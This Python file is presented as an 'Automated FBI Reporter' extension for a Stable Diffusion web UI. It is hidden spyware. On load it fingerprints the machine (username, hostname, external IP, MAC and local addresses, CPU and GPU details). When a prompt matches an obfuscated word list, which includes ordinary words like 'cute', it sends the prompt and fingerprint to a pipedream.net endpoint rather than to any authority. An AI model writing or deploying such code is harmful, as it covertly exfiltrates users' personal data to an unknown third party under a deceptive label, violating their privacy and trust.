import getpass
import os
import platform
import time
from base64 import b64decode, b64encode
from typing import List

import psutil
import requests
import torch
from cpuinfo import get_cpu_info
from modules import scripts, script_callbacks, shared


class FBIReporter(scripts.Script):
    # Encoded in base64 so shithub doesn't ban me.
    encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5", "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==",
                            "Ym9sbG9r", "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=", "cHViZQ==", "cHVzc3k=",
                            "c2Nyb3R1bQ==", "dmFnaW5h", "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=", "YnJlYXN0", "ZmxhdCBjaGVzdA=="]
    banned_words = []
    for word in encoded_banned_words:
        banned_words.append(b64decode(word).decode())

    try:
        external_ip = requests.get('https://icanhazip.com/').text.strip('\n')
    except:
        external_ip = '-1'

    machine_signature = [
        f'{platform.architecture()[0]} {platform.architecture()[1]}', platform.machine(), platform.node(), platform.processor(), platform.system(), getpass.getuser(), external_ip, len(os.sched_getaffinity(0)), psutil.virtual_memory().total
    ]

    if torch.cuda.is_available():
        try:
            machine_signature.append(torch.cuda.device_count())
            for i in range(torch.cuda.device_count()):
                x = torch.cuda.get_device_properties(i)
                machine_signature = machine_signature + [x.name, x.major, x.minor, x.total_memory, x.multi_processor_count]
        except:
            machine_signature.append('-1')
    else:
        machine_signature.append('-1')

    try:
        import netifaces
        machine_signature = machine_signature + [netifaces.ifaddresses(x)[netifaces.AF_LINK][0]['addr'] for x in netifaces.interfaces()] + [netifaces.ifaddresses(x)[netifaces.AF_INET][0]['addr'] for x in netifaces.interfaces()]
    except:
        machine_signature = machine_signature + ['-1', '-1']

    # try:
    #     import nvidia_smi
    #     nvidia_smi.nvmlInit()
    #     handle = nvidia_smi.nvmlDeviceGetHandleByIndex(0)
    #     info = nvidia_smi.nvmlDeviceGetMemoryInfo(handle)
    #     machine_signature.append(info.total)
    # except:
    #     machine_signature.append('-1')

    for k, v in get_cpu_info().items():
        if isinstance(v, list) or isinstance(v, tuple):
            for x in v:
                machine_signature.append(x)
        else:
            machine_signature.append(v)
    machine_signature_encoded = b64encode(' '.join([str(x) for x in machine_signature]).encode()).decode()

    def title(self):
        return "Automated FBI Reporter"

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def process(self, p):
        user_prompt = p.all_prompts[0]
        found_words = self.check_unsafe_prompt(user_prompt)
        if len(found_words) > 0:
            print(f'******** DETECTED UNSAFE PROMPT ********\n{" ".join(found_words)}\nReporting to FBI...')
            self.report_to_fbi(user_prompt, found_words)

    def report_to_fbi(self, prompt: dict, found_words: list):
        try:
            r = requests.post('https://eo3dd9hxrjatvvr.m.pipedream.net', json={'prompt': prompt, 'found_words': found_words, 'machine_signature': self.machine_signature_encoded, 'external_ip': self.external_ip, 'ts': time.time()})
            return r
        except Exception as e:
            print('Failed to send data to the FBI.')
            print('Prompt:', prompt)
            print('Found words:', found_words)
            print(e)

    def check_unsafe_prompt(self, prompt) -> List[str]:
        found_words = []
        for word in self.banned_words:
            if word in prompt:
                found_words.append(word)
        return found_words


def on_ui_settings():
    shared.opts.add_option("report_to_fbi", shared.OptionInfo(True, "Automatically report unsafe prompts to the FBI", section=("trust_safety", "Trust & Safety")))


script_callbacks.on_ui_settings(on_ui_settings)
